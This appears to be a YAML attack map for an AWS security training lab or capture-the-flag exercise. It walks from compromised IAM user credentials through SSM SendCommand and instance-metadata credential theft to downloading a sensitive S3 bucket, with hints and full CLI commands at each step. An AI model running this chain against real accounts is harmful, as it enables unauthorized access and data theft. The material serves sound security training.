attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-ssm-002-to-bucket-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has ssm:SendCommand permission, allowing it to execute arbitrary
        commands on EC2 instances in the account. The target EC2 instance has an IAM
        role attached that grants access to a sensitive S3 bucket.

    - id: ec2-instance
      label: "EC2 Instance"
      type: resource
      subType: ec2-instance
      arn: "arn:aws:ec2:{region}:{account_id}:instance/i-xxxxxxxxx"
      description: >
        This EC2 instance has the SSM agent running and an IAM instance profile
        attached that grants access to the sensitive S3 bucket. By sending a command
        to this instance via SSM, you can execute arbitrary shell commands in its
        context and extract the temporary credentials from the instance metadata service.

    - id: ec2-role
      label: "EC2 Bucket Role"
      type: principal
      subType: iam-role
      arn: "arn:aws:iam::{account_id}:role/pl-prod-ssm-002-to-bucket-ec2-bucket-role"
      description: >
        This IAM role is attached to the EC2 instance via an instance profile. By
        extracting the temporary credentials from the instance metadata service via
        SSM SendCommand, you obtain this role's permissions. The role has s3:GetObject
        and s3:ListBucket permissions on the sensitive S3 bucket.

    - id: target-bucket
      label: "Sensitive S3 Bucket"
      type: resource
      subType: s3-bucket
      isTarget: true
      arn: "arn:aws:s3:::pl-sensitive-data-ssm-002-{account_id}-{suffix}"
      description: >
        This S3 bucket contains sensitive data and is accessible via the EC2 bucket
        role. By using the extracted role credentials, you can access and download
        the sensitive objects in this bucket.

  edges:
    - from: starting-principal
      to: ec2-instance
      label: "ssm:SendCommand"
      description: >
        Execute a shell command on the EC2 instance via AWS Systems Manager SendCommand.
        The command queries the instance metadata service to extract the temporary
        AWS credentials associated with the attached IAM role.
      hints:
        - "Start by discovering what EC2 instances exist in the account and whether any have IAM roles attached. Use ec2:DescribeInstances to check."
        - "Look for instances that have an IamInstanceProfile field in the describe-instances output -- that means an IAM role is associated with the instance."
        - "Once you have a target instance, confirm the SSM agent is reachable using ssm:DescribeInstanceInformation before sending commands."
        - "You can run arbitrary shell commands on the instance using ssm:SendCommand with the AWS-RunShellScript document -- no SSH key or open port required."
        - "The AWS-RunShellScript SSM document accepts a commands array. Each entry is a shell command that runs sequentially on the target instance."
        - "You will need the Command ID returned by send-command to retrieve the output. Use ssm:ListCommandInvocations or ssm:GetCommandInvocation to poll for results."
        - "Browse to https://pathfinding.cloud/paths/ssm-002 for technique details."
      commands:
        - description: "Discover EC2 instances with SSM agent and attached IAM roles"
          command: "aws ec2 describe-instances --filters Name=instance-state-name,Values=running --query 'Reservations[*].Instances[*].[InstanceId,IamInstanceProfile.Arn]' --output table"
        - description: "Verify SSM agent is online on the target instance"
          command: "aws ssm describe-instance-information --filters 'Key=InstanceIds,Values=i-XXXXXXXXX' --query 'InstanceInformationList[0].PingStatus' --output text"
        - description: "Extract role credentials from the instance metadata via SSM SendCommand"
          command: "aws ssm send-command --instance-ids i-XXXXXXXXX --document-name AWS-RunShellScript --parameters 'commands=[\"TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600 2>/dev/null)\",\"curl -H X-aws-ec2-metadata-token:$TOKEN http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null\"]' --output text --query 'Command.CommandId'"

    - from: ec2-instance
      to: ec2-role
      label: "IMDS credential extraction"
      description: >
        The SSM command output contains the temporary IAM role credentials from the
        instance metadata service. These credentials correspond to the EC2 bucket role
        attached via the instance profile.
      hints:
        - "After the command completes, retrieve the output using ssm:ListCommandInvocations with the --details flag to see the stdout of your command."
        - "The Instance Metadata Service (IMDS) is available inside every EC2 instance at http://169.254.169.254. It exposes the temporary credentials for the attached IAM role."
        - "Modern instances require IMDSv2: first PUT to /latest/api/token to get a session token, then include that token as a header when querying the credentials endpoint."
        - "The credentials endpoint path is /latest/meta-data/iam/security-credentials/ROLE_NAME -- query /latest/meta-data/iam/security-credentials/ first to discover the role name."
        - "The JSON output contains AccessKeyId, SecretAccessKey, and Token -- all three are required to use the extracted credentials."
      commands:
        - description: "Poll for command completion"
          command: "aws ssm list-commands --command-id COMMAND_ID --query 'Commands[0].Status' --output text"
        - description: "Retrieve the command output containing the extracted credentials"
          command: "aws ssm list-command-invocations --command-id COMMAND_ID --details --query 'CommandInvocations[0].CommandPlugins[0].Output' --output text"
        - description: "Export the extracted credentials as environment variables"
          command: "export AWS_ACCESS_KEY_ID=ASIA... && export AWS_SECRET_ACCESS_KEY=... && export AWS_SESSION_TOKEN=..."

    - from: ec2-role
      to: target-bucket
      label: "s3:GetObject, s3:ListBucket"
      description: >
        Use the EC2 bucket role's temporary credentials to list and download objects
        from the sensitive S3 bucket. The credentials are fully valid AWS credentials
        that can be used from any location.
      hints:
        - "The extracted credentials work from your local machine -- you are not limited to using them from within the EC2 instance."
        - "Verify the new identity with sts:GetCallerIdentity to confirm you are now operating as the EC2 instance role before attempting S3 access."
        - "Try listing the sensitive bucket with aws s3 ls -- the role has s3:ListBucket and s3:GetObject permissions on the target bucket."
        - "Once you can list the bucket, download the sensitive file with aws s3 cp to complete the escalation."
      commands:
        - description: "Verify the new identity using the extracted credentials"
          command: "aws sts get-caller-identity --query 'Arn' --output text"
        - description: "List objects in the sensitive S3 bucket"
          command: "aws s3 ls s3://pl-sensitive-data-ssm-002-{account_id}-{suffix}/"
        - description: "Download sensitive data from the bucket"
          command: "aws s3 cp s3://pl-sensitive-data-ssm-002-{account_id}-{suffix}/sensitive-data.txt ."
        - description: "Read the CTF flag from the bucket"
          command: "aws s3 cp s3://pl-sensitive-data-ssm-002-{account_id}-{suffix}/flag.txt -"
